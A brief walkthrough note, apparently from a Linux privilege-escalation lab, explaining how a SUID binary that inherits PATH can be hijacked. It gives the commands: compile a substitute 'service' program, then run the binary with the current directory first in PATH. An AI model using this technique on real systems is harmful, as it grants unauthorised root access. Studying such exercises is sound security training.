1. The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
2. gcc -o service /home/user/tools/suid/service.c
3. PATH=.:$PATH /usr/local/bin/suid-env